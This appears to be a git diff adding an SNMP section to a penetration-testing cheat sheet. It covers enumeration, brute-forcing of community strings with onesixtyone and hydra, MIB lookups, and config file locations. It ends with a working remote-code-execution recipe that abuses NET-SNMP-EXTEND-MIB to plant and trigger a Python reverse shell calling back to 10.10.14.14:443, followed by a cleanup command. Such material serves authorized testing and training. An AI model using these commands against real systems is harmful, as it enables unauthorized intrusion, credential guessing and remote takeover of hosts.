@@ -32,6 +32,7 @@ Other great cheetsheets:
   - [3.13. 139,445 - SMB Enumeration](#313-139445---smb-enumeration)
     - [3.13.1. Listing SMB Shares](#3131-listing-smb-shares)
     - [3.13.2. Interacting on SMB](#3132-interacting-on-smb)
+  - [3.14. 161,162,10161,10162 - Simple Network Management Protocol (SNMP)](#314-1611621016110162---simple-network-management-protocol-snmp)
   - [3.14. 1433 - Microsoft SQL Server Enumeration](#314-1433---microsoft-sql-server-enumeration)
     - [3.14.1. MS SQL Server Command Execution](#3141-ms-sql-server-command-execution)
   - [3.15. 2049 - NFS Enumeration](#315-2049---nfs-enumeration)
@@ -702,6 +703,96 @@ smb:\> get filename.txt  # fetch a file
 # mount smb share
 mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
 ```
+
+## 3.14. 161,162,10161,10162 - Simple Network Management Protocol (SNMP)
+
+Before getting started, install the MIBs:
+
+```sh
+sudo apt install -y snmp snmp-mibs-downloader
+sudo download-mibs
+```
+
+For resolving further issues with MIBs, see [Using and loading MIBs](https://net-snmp.sourceforge.io/wiki/index.php/TUT:Using_and_loading_MIBS)
+
+Basic SNMP enumeration:
+
+```sh
+# nmap snmp scan
+nmap --script "snmp* and not snmp-brute" $VICTIM_IP
+
+# quick bruteforce snmp community strings with onesixtyone
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $VICTIM_IP -w 100
+
+# extended bruteforce snmp community strings with hydra
+hydra -P /usr/share/seclists/Discovery/SNMP/snmp.txt -v $VICTIM_IP snmp
+
+# comprehensive enumeration (system/network/process/software info)
+snmp-check $VICTIM_IP
+
+# basic enumeration with onesixtyone, using default 'public' community string
+onesixtyone $VICTIM_IP public
+
+# getting system description (like uname -a on Linux systems)
+snmpget -v2c -c public localhost SNMPv2-MIB::sysDescr.0
+
+# view installed snmp software on victim
+snmpwalk -v2c -c public $VICTIM_IP HOST-RESOURCES-MIB::hrSWInstalledName | grep -i snmp
+
+# get ALL info available on SNMP
+snmpwalk -v2c -c public $VICTIM_IP .iso
+```
+
+Look [here](https://www.rapid7.com/blog/post/2016/05/05/snmp-data-harvesting-during-penetration-testing/) for some other ideas on getting juicy data from snmp.
+
+Exploring MIBs with [snmptranslate](https://net-snmp.sourceforge.io/tutorial/tutorial-5/commands/snmptranslate.html):
+
+```sh
+# convert abbreviated OID to numeric
+snmptranslate -On SNMPv2-MIB::sysDescr.0
+
+# convert abbreviated OID to dotted-text
+snmptranslate -Of SNMPv2-MIB::sysDescr.0
+
+# get description/extended info about OID node
+snmptranslate -Td SNMPv2-MIB::sysDescr.0
+
+# get tree view of subset of MIB tree
+snmptranslate -Tp -IR system
+```
+
+Also search for OID info at [http://www.oid-info.com/](http://www.oid-info.com/basic-search.htm)
+
+**SNMP config files:**
+
+- Typical locations:
+  - `/etc/`
+  - `/etc/snmp/`
+  - `~/.snmp/`
+- Common filenames:
+  - snmp.conf
+  - snmpd.conf
+  - snmp-config.xml
+
+**Arbitrary remote code execution with SNMP**
+
+See [Hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce)
+
+Easy library to do this: [https://github.com/mxrch/snmp-shell.git](https://github.com/mxrch/snmp-shell.git)
+
+```sh
+# manually create reverse shell (update listener IP)
+snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c private $VICTIM_IP 'nsExtendStatus."derp"' = createAndGo 'nsExtendCommand."derp"' = /usr/bin/python3 'nsExtendArgs."derp"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.14\",443));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
+
+# trigger reverse shell by reading the OID
+snmpwalk -v2c -c private $VICTIM_IP NET-SNMP-EXTEND-MIB::nsExtendObjects
+
+# delete the reverse shell command from the SNMP table
+snmpset -m +NET-SNMP-EXTEND-MIB -v2c -c privagte $VICTIM_IP 'nsExtendStatus."derp"' = destroy
+```
+
+This abuses the NET-SNMP-EXTEND-MIB functionality. See [technical writeup](https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/)
+
 
 ## 3.14. 1433 - Microsoft SQL Server Enumeration
 
